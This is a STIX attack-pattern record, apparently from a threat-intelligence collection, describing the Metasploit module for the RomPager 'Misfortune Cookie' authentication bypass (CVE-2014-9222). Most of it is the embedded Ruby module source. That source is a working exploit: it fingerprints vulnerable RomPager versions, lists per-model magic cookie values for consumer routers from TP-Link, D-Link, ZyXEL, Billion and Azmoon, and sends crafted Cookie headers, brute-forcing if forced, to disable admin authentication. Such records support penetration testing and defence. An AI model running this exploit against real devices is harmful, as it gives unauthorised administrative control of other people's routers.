{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b9dfd562-af0c-4837-8799-bddd8a40e023",
    "created": "2024-08-14T16:23:56.993703Z",
    "modified": "2024-08-14T16:23:56.993712Z",
    "name": "\"Allegro Software RomPager Misfortune Cookie (CVE-2014-9222) Authentication Bypass\"",
    "description": " This module exploits HTTP servers that appear to be vulnerable to the 'Misfortune Cookie' vulnerability which affects Allegro Software Rompager versions before 4.34 and can allow attackers to authenticate to the HTTP service as an administrator without providing valid credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/allegro_rompager_auth_bypass.rb",
            "external_id": "allegro_rompager_auth_bypass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-9222"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20191006135858/http://mis.fortunecook.ie/"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20190623150837/http://mis.fortunecook.ie/too-many-cooks-exploiting-tr069_tal-oppenheim_31c3.pdf#31C3presentationwithPOC"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => \"Allegro Software RomPager 'Misfortune Cookie' (CVE-2014-9222) Authentication Bypass\",\n        'Description' => %q{\n          This module exploits HTTP servers that appear to be vulnerable to the\n          'Misfortune Cookie' vulnerability which affects Allegro Software\n          Rompager versions before 4.34 and can allow attackers to authenticate\n          to the HTTP service as an administrator without providing valid\n          credentials.\n        },\n        'Author' => [\n          'Jon Hart <jon_hart[at]rapid7.com>', # metasploit scanner module\n          'Jan Trencansky <jan.trencansky[at]gmail.com>', # metasploit auxiliary admin module\n          'Lior Oppenheim' # CVE-2014-9222\n        ],\n        'References' => [\n          ['CVE', '2014-9222'],\n          ['URL', 'https://web.archive.org/web/20191006135858/http://mis.fortunecook.ie/'],\n          ['URL', 'https://web.archive.org/web/20190207102911/http://mis.fortunecook.ie/misfortune-cookie-suspected-vulnerable.pdf'], # list of likely vulnerable devices\n          ['URL', 'https://web.archive.org/web/20190623150837/http://mis.fortunecook.ie/too-many-cooks-exploiting-tr069_tal-oppenheim_31c3.pdf'] # 31C3 presentation with POC\n        ],\n        'DisclosureDate' => '2014-12-17',\n        'License' => MSF_LICENSE\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'URI to test', '/']),\n      ], Exploit::Remote::HttpClient\n    )\n\n    register_advanced_options(\n      [\n        Msf::OptBool.new('ForceAttempt', [ false, 'Force exploit attempt for all known cookies', false ]),\n      ], Exploit::Remote::HttpClient\n    )\n  end\n\n  def headers\n    {\n      'Referer' => full_uri\n    }\n  end\n\n  # List of known values and models\n  def devices_list\n    known_devices = {\n      :'AZ-D140W' =>\n          {\n            name: 'Azmoon', model: 'AZ-D140W', values: [\n              [107367693, 13]\n            ]\n          },\n      :'BiPAC 5102S' =>\n            {\n              name: 'Billion', model: 'BiPAC 5102S', values: [\n                [107369694, 13]\n              ]\n            },\n      :'BiPAC 5200' =>\n            {\n              name: 'Billion', model: 'BiPAC 5200', values: [\n                [107369545, 9],\n                [107371218, 21]\n              ]\n            },\n      :'BiPAC 5200A' =>\n            {\n              name: 'Billion', model: 'BiPAC 5200A', values: [\n                [107366366, 25],\n                [107371453, 9]\n              ]\n            },\n      :'BiPAC 5200GR4' =>\n            {\n              name: 'Billion', model: 'BiPAC 5200GR4', values: [\n                [107367690, 21]\n              ]\n            },\n      :'BiPAC 5200SRD' =>\n            {\n              name: 'Billion', model: 'BiPAC 5200SRD', values: [\n                [107368270, 1],\n                [107371378, 3],\n                [107371218, 13]\n              ]\n            },\n      :'DSL-2520U' =>\n            {\n              name: 'D-Link', model: 'DSL-2520U', values: [\n                [107368902, 25]\n              ]\n            },\n      :'DSL-2600U' =>\n            {\n              name: 'D-Link', model: 'DSL-2600U', values: [\n                [107366496, 13],\n                [107360133, 20]\n              ]\n            },\n      :'TD-8616' =>\n            {\n              name: 'TP-Link', model: 'TD-8616', values: [\n                [107371483, 21],\n                [107369790, 17],\n                [107371161, 1],\n                [107371426, 17],\n                [107370211, 5],\n              ]\n            },\n      :'TD-8817' =>\n            {\n              name: 'TP-Link', model: 'TD-8817', values: [\n                [107369790, 17],\n                [107369788, 1],\n                [107369522, 25],\n                [107369316, 21],\n                [107369321, 9],\n                [107351277, 20]\n              ]\n            },\n      :'TD-8820' =>\n            {\n              name: 'TP-Link', model: 'TD-8820', values: [\n                [107369768, 17]\n              ]\n            },\n      :'TD-8840T' =>\n            {\n              name: 'TP-Link', model: 'TD-8840T', values: [\n                [107369845, 5],\n                [107369790, 17],\n                [107369570, 1],\n                [107369766, 1],\n                [107369764, 5],\n                [107369688, 17]\n              ]\n            },\n      :'TD-W8101G' =>\n            {\n              name: 'TP-Link', model: 'TD-W8101G', values: [\n                [107367772, 37],\n                [107367808, 21],\n                [107367751, 21],\n                [107367749, 13],\n                [107367765, 25],\n                [107367052, 25],\n                [107365835, 1]\n              ]\n            },\n      :'TD-W8151N' =>\n            {\n              name: 'TP-Link', model: 'TD-W8151N', values: [\n                [107353867, 24]\n              ]\n            },\n      :'TD-W8901G' =>\n            {\n              name: 'TP-Link', model: 'TD-W8901G', values: [\n                [107367787, 21],\n                [107368013, 5],\n                [107367854, 9],\n                [107367751, 21],\n                [107367749, 13],\n                [107367765, 25],\n                [107367682, 21],\n                [107365835, 1],\n                [107367052, 25]\n              ]\n            },\n      :'TD-W8901GB' =>\n            {\n              name: 'TP-Link', model: 'TD-W8901GB', values: [\n                [107367756, 13],\n                [107369393, 21]\n              ]\n            },\n      :'TD-W8901N' =>\n            {\n              name: 'TP-Link', model: 'TD-W8901N', values: [\n                [107353880, 0]\n              ]\n            },\n      :'TD-W8951ND' =>\n            {\n              name: 'TP-Link', model: 'TD-W8951ND', values: [\n                [107369839, 25],\n                [107369876, 13],\n                [107366743, 21],\n                [107364759, 25],\n                [107364759, 13],\n                [107364760, 21]\n              ]\n            },\n      :'TD-W8961NB' =>\n            {\n              name: 'TP-Link', model: 'TD-W8961NB', values: [\n                [107369844, 17],\n                [107367629, 21],\n                [107366421, 13]\n              ]\n            },\n      :'TD-W8961ND' =>\n            {\n              name: 'TP-Link', model: 'TD-W8961ND', values: [\n                [107369839, 25],\n                [107369876, 13],\n                [107364732, 25],\n                [107364771, 37],\n                [107364762, 29],\n                [107353880, 0],\n                [107353414, 36]\n              ]\n            },\n      :'P-660R-T3 v3' => # This value works on devices with model P-660R-T3 v3 not P-660R-T3 v3s\n            {\n              name: 'ZyXEL', model: 'P-660R-T3', values: [\n                [107369567, 21]\n              ]\n            },\n      :'P-660RU-T3 v2' => # Couldn't verify this\n            {\n              name: 'ZyXEL', model: 'P-660R-T3', values: [\n                [107369567, 21]\n              ]\n            },\n      ALL => # Used when `ForceAttempt` === true\n            { name: 'Unknown', model: 'Forced', values: [] }\n    }\n    # collect all known cookies for a brute force option\n    all_cookies = []\n    known_devices.collect { |_, v| v[:values] }.each do |list|\n      all_cookies += list\n    end\n    known_devices[:ALL][:values] = all_cookies.uniq\n    known_devices\n  end\n\n  def check_response_fingerprint(res, fallback_status)\n    fp = http_fingerprint(response: res)\n    vprint_status(\"Fingerprint: #{fp}\")\n    # ensure the fingerprint at least appears vulnerable\n    if %r{RomPager/(?<version>[\\d.]+)} =~ fp\n      vprint_status(\"#{peer} is RomPager #{version}\")\n      if Rex::Version.new(version) < Rex::Version.new('4.34') && /realm=\"(?<model>.+)\"/ =~ fp\n        return model\n      end\n    end\n    fallback_status\n  end\n\n  def run\n    res = send_request_raw(\n      'uri' => normalize_uri(target_uri.path.to_s),\n      'method' => 'GET'\n    )\n    model = check_response_fingerprint(res, Exploit::CheckCode::Detected)\n    if model != Exploit::CheckCode::Detected\n      devices = devices_list[model.to_sym]\n      devices = devices_list[:ALL] if devices.nil? && datastore['ForceAttempt']\n      if !devices.nil?\n        print_good(\"Detected device:#{devices[:name]} #{devices[:model]}\")\n        devices[:values].each do |value|\n          cookie = \"C#{value[0]}=#{'B' * value[1]}\\x00\"\n          res = send_request_raw(\n            'uri' => normalize_uri(target_uri.path.to_s),\n            'method' => 'GET',\n            'headers' => headers.merge('Cookie' => cookie)\n          )\n          if !res.nil? && (res.code <= 302)\n            print_good('Good response, please check host, authentication should be disabled')\n            break\n          else\n            print_error('Bad response')\n          end\n        end\n      else\n        print_error(\"No matching values for fingerprint #{model}\")\n      end\n    else\n      print_error('Unknown device')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-12-17"
}